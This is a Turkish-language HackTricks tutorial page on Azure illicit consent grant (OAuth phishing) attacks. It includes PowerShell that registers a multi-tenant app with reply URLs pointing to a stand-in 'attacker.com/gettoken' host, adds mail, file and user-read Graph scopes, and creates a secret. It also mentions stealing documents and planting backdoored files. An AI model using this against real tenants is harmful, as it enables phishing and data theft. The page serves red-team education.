# Az - Illicit Consent Grant

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub depolarına.

</details>
{% endhint %}

## OAuth App Phishing

**Azure Applications**, **kullanıcı verilerine** (temel bilgiler, belgeler, e-posta gönderme...) erişim izni ister.\
**İzin verilirse**, normal bir kullanıcı yalnızca **"Düşük Etki" izinleri** için onay verebilir. **Diğer tüm** durumlarda, **yönetici onayı gereklidir**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme izni` içeren özel bir rol, kiracı genelinde onay verebilir.

Yalnızca **yönetici onayı gerektirmeyen** izinler **düşük etki** olarak sınıflandırılır. Bunlar, **temel oturum açma için gerekli olan openid, profile, email, User.Read ve offline\_access** izinleridir. Bir **kuruluş** **tüm uygulamalar için** kullanıcı onayına **izin veriyorsa**, bir çalışan bir uygulamaya **profilinden yukarıdakileri okuma izni** verebilir.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Bu nedenle, bir saldırgan **kötü niyetli bir Uygulama** hazırlayabilir ve bir **phishing** ile kullanıcıyı **Uygulamayı kabul etmeye ve verilerini çalmaya** zorlayabilir.

### 2 Tür Yasadışı Onay Verme Saldırısı

* **Kimlik Doğrulaması Olmayan**: Dış bir hesaptan `User.Read` ve `User.ReadBasic.All` izinlerine sahip bir uygulama oluşturun, bir kullanıcıyı phish yapın ve dizin bilgilerine erişebilirsiniz.
* Bu, phish yapılan kullanıcının dış ortamlardan OAuth uygulamalarını kabul edebilmesini gerektirir!
* **Kimlik Doğrulamalı**: Yeterli ayrıcalıklara sahip bir kullanıcıyı ele geçirerek, hesap içinde bir uygulama oluşturun ve ayrıcalıklı OAuth izinlerini kabul edebilecek ayrıcalıklı bir kullanıcıyı phish yapın.
* Bu durumda zaten dizin bilgilerine erişebilirsiniz, bu yüzden `User.ReadBasic.All` izni artık ilginç değildir.
* Muhtemelen **yönetici onayı gerektiren izinlerle** ilgileniyorsunuz, çünkü normal kullanıcılar OAuth uygulamalarına herhangi bir izin veremez, bu yüzden yalnızca **bu kullanıcıları phish yapmanız gerekir** (bu ayrıcalığı hangi rollerin/izinlerin verdiği hakkında daha fazla bilgi daha sonra)

### Kullanıcıların onay verip veremeyeceğini kontrol edin

Aşağıdaki PowerShell komutu, Azure Active Directory (Azure AD) kullanıcılarının uygulamalara onay verme yetenekleriyle ilgili onay yapılandırmasını kontrol etmek için kullanılır:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Disable user consent**: Bu ayar, kullanıcıların uygulamalara izin vermesini yasaklar. Hiçbir kullanıcı uygulamalara izin veremez.
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select**: Bu ayar, tüm kullanıcıların yalnızca doğrulanmış bir yayıncı tarafından yayınlanan ve kendi kiracınızda kayıtlı uygulamalara izin vermesine olanak tanır. Belirli izinler için izin vererek bir kontrol katmanı ekler.
* **Users can consent to all apps**: Bu ayar daha izin vericidir ve tüm kullanıcıların, yönetici izni gerektirmeyen izinler için herhangi bir uygulamaya izin vermesine olanak tanır.
* **Custom app consent policy**: Bu ayar, özel bir politikanın yürürlükte olduğunu ve uygulama yayıncısına, uygulamanın talep ettiği izinlere ve diğer faktörlere dayalı olarak kısıtlamaların bir kombinasyonunu içerebileceğini belirtir.

## **Illicit Consent Grant Attack Anlama**

Bir illicit consent grant attack'ta, saldırganlar son kullanıcıları Azure ile kayıtlı kötü niyetli bir uygulamaya izin vermeleri için kandırır. Bu, uygulamayı meşru göstererek yapılır ve kurbanların farkında olmadan "Kabul Et" düğmesine tıklamasına neden olur. Sonuç olarak, Azure AD saldırganın sitesine bir token verir ve bu da saldırganın kurbanın verilerine erişmesine ve bunları manipüle etmesine olanak tanır, örneğin e-postaları okuma veya gönderme ve dosyalara erişme gibi, kurumsal bir hesap gerektirmeden.

## **Saldırı Akışının Genel Görünümü**

Saldırı, genel bir şirketi hedef alan birkaç adımı içerir. İşte nasıl gerçekleşebileceği:

1. **Domain Registration and Application Hosting**: Saldırgan, güvenilir bir siteye benzeyen bir domain kaydeder, örneğin "safedomainlogin.com". Bu domain altında, yetkilendirme kodlarını yakalamak ve erişim tokenları talep etmek için bir uygulama barındırmak üzere bir alt domain oluşturulur (örneğin, "companyname.safedomainlogin.com").
2. **Application Registration in Azure AD**: Saldırgan, Azure AD Tenant'ında hedef şirketin adını taşıyan bir Multi-Tenant Application kaydeder ve meşru görünmesini sağlar. Uygulamanın Yönlendirme URL'sini kötü niyetli uygulamayı barındıran alt domain'e yönlendirir.
3. **Setting Up Permissions**: Saldırgan, uygulamayı çeşitli API izinleriyle (örneğin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) ayarlar. Bu izinler, kullanıcı tarafından verildiğinde, saldırganın kullanıcı adına hassas bilgileri çıkarmasına olanak tanır.
4. **Distributing Malicious Links**: Saldırgan, kötü niyetli uygulamanın client id'sini içeren bir bağlantı hazırlar ve hedeflenen kullanıcılarla paylaşarak onları izin vermeleri için kandırır.

## **Saldırı İçin Araçları Kullanma**

Saldırı, [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) gibi araçlar kullanılarak kolaylaştırılabilir.

### Saldırı Öncesi Hazırlık:

Saldırgan, kurban organizasyondaki bir kullanıcıya bir düzeyde erişime sahipse, organizasyonun politikasının kullanıcının uygulamaları kabul etmesine izin verip vermediğini kontrol edebilir:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Saldırıyı gerçekleştirmek için, saldırganın **Azure Tenant'larında yeni bir Uygulama** (App registrations içinde) oluşturması ve şu izinlerle yapılandırması gerekecektir:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`, `Microsoft Graph` içinde `Delegated permissions` altındadır. (Application permissions her zaman ekstra onay gerektirir).

* `User.ReadBasic.All`, izin verildiğinde organizasyondaki **tüm kullanıcıların bilgilerini okumanıza** olanak tanıyan izindir.
* Unutmayın ki sadece `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `permission to grant permissions to applications` içeren özel bir rol tenant genelinde onay verebilir. Bu yüzden, **yönetici onayı gerektiren bir Uygulamayı onaylamasını** istiyorsanız, bu rollerden birine sahip bir kullanıcıyı **phish** etmelisiniz.

Ayrıca cli ile bir Uygulama oluşturabilirsiniz:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresine giderek nasıl yapılandırılacağını öğrenin.

{% hint style="warning" %}
Elde edilen **erişim belirteci**nin, **graph endpoint** için `User.Read` ve `User.ReadBasic.All` kapsamlarıyla (istenen izinler) olacağını unutmayın. Diğer işlemleri gerçekleştiremeyeceksiniz (ancak bunlar, organizasyondaki tüm kullanıcılar hakkında bilgi indirmek için yeterlidir).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Bu saldırıyı gerçekleştirmek için bu aracı da kullanabilirsiniz.

## Post-Exploitation

Kullanıcıya erişim sağladıktan sonra, hassas belgeleri çalmak ve hatta arka kapılı belge dosyaları yüklemek gibi şeyler yapabilirsiniz.

## Referanslar

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) üzerinde bizi takip edin.
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking ipuçlarını paylaşın.

</details>
{% endhint %}
